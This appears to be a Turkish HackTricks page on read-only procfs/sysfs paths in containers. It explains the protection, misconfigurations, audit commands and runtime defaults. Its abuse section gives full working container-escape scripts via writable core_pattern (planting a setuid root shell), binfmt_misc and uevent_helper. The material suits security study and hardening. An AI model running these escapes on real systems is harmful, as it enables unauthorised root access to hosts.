# Salt Okunur Sistem Yolları

{{#include ../../../../banners/hacktricks-training.md}}

Salt okunur sistem yolları, masked paths korumasından ayrı bir korumadır. Bir path'i tamamen gizlemek yerine runtime onu görünür bırakır ancak salt okunur olarak mount eder. Bu, read access'in kabul edilebilir veya operasyonel olarak gerekli olabileceği, ancak write işlemlerinin çok tehlikeli olacağı seçili procfs ve sysfs konumları için yaygındır.

Amaç basittir: birçok kernel interface'i writable olduğunda çok daha tehlikeli hale gelir. Salt okunur bir mount, tüm reconnaissance değerini ortadan kaldırmaz; ancak compromised bir workload'un bu path üzerinden temel kernel-facing dosyaları değiştirmesini engeller.

## İşleyiş

Runtime'lar proc/sys görünümünün bazı bölümlerini sıklıkla salt okunur olarak işaretler. Runtime'a ve host'a bağlı olarak bu, aşağıdaki path'leri içerebilir:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Gerçek liste değişiklik gösterir, ancak model aynıdır: gerektiğinde visibility sağla, mutation işlemlerini varsayılan olarak engelle.

## Lab

Docker tarafından bildirilen salt okunur path listesini inceleyin:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Container içinden bağlanmış proc/sys görünümünü inceleyin:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Güvenlik Etkisi

Salt okunur system paths, host'u etkileyen kötüye kullanımın geniş bir sınıfını sınırlar. Bir attacker procfs veya sysfs'ı inceleyebilse bile, bu alanlara yazamamak kernel tunables, crash handlers, module-loading helpers veya diğer control interfaces ile ilgili birçok doğrudan modification path'ini ortadan kaldırır. Exposure tamamen ortadan kalkmaz, ancak information disclosure'dan host influence'a geçiş zorlaşır.

## Yanlış Yapılandırmalar

Başlıca hatalar; hassas path'leri unmask etmek veya read-write olarak yeniden mount etmek, host proc/sys içeriğini writable bind mounts ile doğrudan expose etmek ya da daha güvenli runtime defaults'larını etkili biçimde bypass eden privileged modes kullanmaktır. Kubernetes'te `procMount: Unmasked` ve privileged workloads genellikle daha zayıf proc protection ile birlikte görülür. Bir diğer yaygın operational mistake ise runtime'ın bu path'leri genellikle read-only olarak mount etmesi nedeniyle tüm workloads'ların hâlâ bu default'u devraldığını varsaymaktır.

## Kötüye Kullanım

Protection zayıfsa, writable proc/sys entries arayarak başlayın:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Yazılabilir girdiler mevcut olduğunda, yüksek değerli takip yolları şunlardır:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Bu komutların ortaya çıkarabilecekleri:

- `/proc/sys` altındaki yazılabilir girdiler, container’ın yalnızca inceleme yapmakla kalmayıp host kernel davranışını değiştirebildiği anlamına gelir.
- `core_pattern` özellikle önemlidir; çünkü host’a yönelik yazılabilir bir değer, pipe handler ayarlandıktan sonra bir process’i crash ettirerek host code-execution yoluna dönüştürülebilir.
- `modprobe`, kernel’in module-loading ile ilgili akışlarda kullandığı helper’ı ortaya çıkarır; yazılabilir olduğunda klasik ve yüksek değerli bir hedeftir.
- `binfmt_misc`, custom interpreter registration işleminin mümkün olup olmadığını gösterir. Registration yazılabilirse bu, yalnızca bir information leak olmak yerine bir execution primitive hâline gelebilir.
- `panic_on_oom`, host genelindeki bir kernel kararını kontrol eder ve bu nedenle resource exhaustion durumunu host denial of service saldırısına dönüştürebilir.
- `uevent_helper`, yazılabilir bir sysfs helper path’inin host context içinde execution sağlamasına en açık örneklerden biridir.

İlgi çekici bulgular arasında, normalde read-only olması gereken yazılabilir host-facing proc knob’ları veya sysfs entry’leri bulunur. Bu noktada workload, kısıtlanmış bir container görünümünden anlamlı kernel etkisine doğru ilerlemiş olur.

### Full Example: `core_pattern` Host Escape

`/proc/sys/kernel/core_pattern` container içinden yazılabilir durumdaysa ve host kernel görünümünü gösteriyorsa, crash sonrasında bir payload execute etmek için abuse edilebilir:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Yol gerçekten host kernel’a ulaşıyorsa payload host üzerinde çalışır ve geride bir setuid shell bırakır.

### Tam Örnek: `binfmt_misc` Kaydı

`/proc/sys/fs/binfmt_misc/register` yazılabilirse, özel bir interpreter kaydı, eşleşen dosya çalıştırıldığında code execution sağlayabilir:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Host'a açık, yazılabilir bir `binfmt_misc` üzerinde sonuç, kernel tarafından tetiklenen interpreter yolunda code execution elde edilmesidir.

### Tam Örnek: `uevent_helper`

`/sys/kernel/uevent_helper` yazılabilirse kernel, eşleşen bir olay tetiklendiğinde host-path helper'ını çağırabilir:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Bunun bu kadar tehlikeli olmasının nedeni, helper path'in güvenli, yalnızca container'a ait bir context yerine host filesystem perspektifinden çözümlenmesidir.

## Checks

Bu kontroller, procfs/sysfs exposure'ın beklenen yerlerde read-only olup olmadığını ve workload'un hassas kernel interface'lerini hâlâ değiştirip değiştiremediğini belirler.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Burada ilginç olan nedir:

- Normal şekilde harden edilmiş bir workload, çok az sayıda yazılabilir proc/sys girdisi açığa çıkarmalıdır.
- Yazılabilir `/proc/sys` yolları, sıradan okuma erişiminden genellikle daha önemlidir.
- Runtime bir yolun salt okunur olduğunu söylüyor ancak yol pratikte yazılabilir durumdaysa mount propagation, bind mounts ve privilege ayarlarını dikkatlice inceleyin.

## Runtime Varsayılanları

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatma |
| --- | --- | --- | --- |
| Docker Engine | Varsayılan olarak etkin | Docker, hassas proc girdileri için varsayılan bir salt okunur yol listesi tanımlar | host proc/sys mount'larını açığa çıkarma, `--privileged` |
| Podman | Varsayılan olarak etkin | Podman, açıkça gevşetilmediği sürece varsayılan salt okunur yolları uygular | `--security-opt unmask=ALL`, geniş host mount'ları, `--privileged` |
| Kubernetes | Runtime varsayılanlarını devralır | Pod ayarları veya host mount'ları ile zayıflatılmadığı sürece temel runtime'ın salt okunur yol modelini kullanır | `procMount: Unmasked`, privileged workload'lar, yazılabilir host proc/sys mount'ları |
| Kubernetes altında containerd / CRI-O | Runtime varsayılanı | Genellikle OCI/runtime varsayılanlarına dayanır | Kubernetes satırındakiyle aynıdır; doğrudan runtime yapılandırması değişiklikleri davranışı zayıflatabilir |

Temel nokta, salt okunur sistem yollarının genellikle runtime varsayılanı olarak mevcut olmasıdır; ancak privileged modlar veya host bind mount'ları ile bu korumaları zayıflatmak kolaydır.
{{#include ../../../../banners/hacktricks-training.md}}
